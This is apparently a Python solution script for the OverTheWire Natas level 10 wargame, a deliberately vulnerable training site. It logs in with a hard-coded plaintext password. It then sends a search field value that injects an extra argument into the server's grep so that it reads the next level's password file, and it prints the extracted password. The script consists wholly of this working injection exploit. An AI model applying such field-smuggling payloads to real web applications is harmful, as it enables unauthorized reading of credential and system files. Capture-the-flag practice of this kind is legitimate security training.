import requests
import re

s = requests.session()
s.auth = ("natas10","nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu")

#req = s.get("http://natas9.natas.labs.overthewire.org")
data = requests.Request("POST","http://natas10.natas.labs.overthewire.org", data={"needle":"u /etc/natas_webpass/natas11","Submit":"Search"})
game = s.send(s.prepare_request(data))
nextcode = re.findall('[a-zA-Z0-9]{32}',game.text)

print(nextcode[1])

